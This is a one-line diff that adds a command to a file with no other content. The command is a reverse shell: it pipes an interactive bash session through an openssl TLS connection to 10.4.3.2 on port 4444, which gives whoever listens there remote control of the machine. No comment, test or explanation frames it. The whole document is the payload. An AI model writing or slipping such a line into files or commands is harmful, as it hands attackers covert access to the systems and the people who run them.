@@ -1,0 +1,1 @@
+mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.4.3.2:4444 > /tmp/s; rm /tmp/s
